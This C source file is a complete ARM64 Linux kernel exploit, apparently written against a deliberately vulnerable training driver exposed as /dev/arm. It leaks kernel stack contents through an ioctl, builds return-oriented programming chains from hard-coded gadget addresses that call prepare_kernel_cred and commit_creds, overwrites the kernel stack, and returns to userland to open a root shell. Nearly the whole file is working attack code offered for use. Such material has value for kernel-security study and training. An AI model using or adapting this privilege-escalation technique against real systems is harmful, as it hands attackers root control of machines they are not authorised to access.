#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define WRITE_STACK 0
#define READ_STACK 1

#define MAX_MSG 1024
#define GFP_KERNEL 0xcc0

unsigned long prepare_kernel_cred = 0xffff8000100a24d0;
unsigned long commit_creds = 0xffff8000100a2218;
unsigned long mov_x1_x0_vice_versa = 0xffff80001069dd98; // mov x1, x0; mov x0, x1; ldp x29, x30, [sp], #0x10; ret; 
unsigned long pop_x0 = 0xffff8000100394c8; // ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;
unsigned long stacklift = 0xffff800010011a68; // mov sp, x26; blr x1; 
unsigned long pop_x26 = 0xffff8000101ae80c; // ldr x26, [sp, #0x40]; ldp x19, x20, [sp, #0x10]; ldp x21, x23, [sp, #0x20]; ldp x29, x30, [sp], #0x60; ret;
unsigned long pop_x0_pop_x19 = 0xffff80001014db18; // ldr x19, [sp, #0x10]; ldr x0, [sp, #0x28]; ldp x29, x30, [sp], #0x30; ret; 
unsigned long blr_x19_pop_x19 = 0xffff800010810184; // blr x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;

unsigned long kernel_exit = 0xffff8000100124c0;

typedef struct read_write_stack{
	unsigned long size;
	unsigned long *buf;
} read_write_stack;

unsigned long user_sp;

void save_sp(){
	__asm("mov %[user_sp], sp"
		: [user_sp] "=r" (user_sp));
}

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 0){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
		//char *arg[2] = {"/bin/sh", NULL};
        //execve("/bin/sh", arg, NULL);
        // something's wrong, I can feel it
        system("id");
		exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

void create_rop_chain2(unsigned long* mem, unsigned long pstate, unsigned long saved_sp, unsigned long return_address){
	unsigned int off = 0;
	unsigned long dummy = 0xdeadbeefdeadbeef;

	//--------------POP X0, POP X19
	mem[off++] = dummy;
	mem[off++] = blr_x19_pop_x19; // x30
	mem[off++] = prepare_kernel_cred; // x19
	mem[off++] = dummy;
	mem[off++] = dummy;
	mem[off++] = 0x0; // x0
	//--------------BLR X19, POP X19
	mem[off++] = dummy;
	mem[off++] = blr_x19_pop_x19; // x30
	mem[off++] = commit_creds; // x19
	mem[off++] = dummy; // x20
	//--------------BLR X19, POP X19
	mem[off++] = dummy;
	mem[off++] = kernel_exit; // x30
	mem[off++] = dummy; // x19
	mem[off++] = dummy; // x20
	//--------------RET FROM SYSCALL
	mem[off++] = 0x0; // x0
	mem[off++] = 0x0; // x1
	mem[off++] = 0x0; // x2 
	mem[off++] = 0x0; // x3
	mem[off++] = 0x0; // x4
	mem[off++] = 0x0; // x5
	mem[off++] = 0x0; // x6
	mem[off++] = 0x0; // x7
	mem[off++] = 0x0; // x8
	mem[off++] = 0x0; // x9
	mem[off++] = 0x0; // x10
	mem[off++] = 0x0; // x11
	mem[off++] = 0x0; // x12
	mem[off++] = 0x0; // x13
	mem[off++] = 0x0; // x14
	mem[off++] = 0x0; // x15
	mem[off++] = 0x0; // x16
	mem[off++] = 0x0; // x17
	mem[off++] = 0x0; // x18
	mem[off++] = 0x0; // x19
	mem[off++] = 0x0; // x20
	mem[off++] = 0x0; // x21
	mem[off++] = 0x0; // x22
	mem[off++] = 0x0; // x23
	mem[off++] = 0x0; // x24
	mem[off++] = 0x0; // x25
	mem[off++] = 0x0; // x26
	mem[off++] = 0x0; // x27
	mem[off++] = 0x0; // x28
	mem[off++] = 0x0; // x29
	mem[off++] = 0x0; // x30 (sp + 0xf0)
	mem[off++] = saved_sp; // -> sp_el0 
	mem[off++] = return_address; // -> elr_el1
	mem[off++] = pstate; // -> spsr_el1
}

void create_rop_chain(unsigned long* buf, unsigned int off, unsigned long stacklift_addr){
	unsigned long dummy = 0xdeadbeefdeadbeef;
	//-----------__arm64_sys_ioctl
	buf[off++] = pop_x0;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;// __arm64_sys_ioctl pops until here
	//----------POP X0
	buf[off++] = dummy; // sp -> x29
	buf[off++] = mov_x1_x0_vice_versa; // sp + 0x8 -> x30
	buf[off++] = dummy;
	buf[off++] = pop_x0_pop_x19; // sp + 0x18 -> x0
	//----------MOV X1, X0
	buf[off++] = dummy; // sp -> x29
	buf[off++] = pop_x26; // sp + 0x8 -> x30
	//----------POP X26
	buf[off++] = dummy; // sp -> x29
	buf[off++] = stacklift; // x30
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = stacklift_addr;
	buf[off++] = dummy;
	buf[off++] = dummy;
	buf[off++] = dummy;
}

void dump_payload(unsigned long *buf, unsigned int size){
	printf("****************DUMP********************\n");
	for(int i = 0; i < size; i += 2){
		printf("0x%016lx\t0x%016lx\n", buf[i], buf[i+1]);
	}
	printf("****************************************\n");
}

int main(){
	int fd;
	long ret;
    unsigned long *buf = (unsigned long*)malloc(sizeof(unsigned long) * 92);
    read_write_stack messenger;
    messenger.buf = buf;
    unsigned long stack_addr;

	printf("[+] Opening device file...\n");
	fd = open("/dev/arm", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

    messenger.size = 608;

	printf("[+] Trying to read from kernel stack...\n");
	ret = ioctl(fd, READ_STACK, (unsigned long)&messenger);
	if(ret < 0){
		printf("[-] Failed to read from kernel stack\n");
		exit(-1);
	}

	printf("[+] x30 of outer function: 0x%lx\n", buf[66]);
 
	stack_addr = buf[67] - 0x2a8;
	printf("[+] Stack address: 0x%lx\n", stack_addr);

	save_sp();
	printf("[+] Stack pointer: 0x%016lx\n", user_sp);
	for(int i = 0; i < 64; i++){
		buf[i] = 0x4141414141414141;
	}

	create_rop_chain2(buf, 0x0, user_sp, (unsigned long)spawn_shell);
	create_rop_chain(buf, 66, (unsigned long)stack_addr);

	messenger.size = 728;

	printf("[+] Sending payload...\n");
	ret = ioctl(fd, WRITE_STACK, (unsigned long)&messenger);
	if(ret < 0){
		printf("[-] Failed to write to kernel stack\n");
		exit(-1);
	}

	// NO idea why but spawn_shell() does not opens shell
	// however somehow the execution comes here, so here I
	// open the shell
	system("/bin/sh");

	free(buf);
	return 0;
}
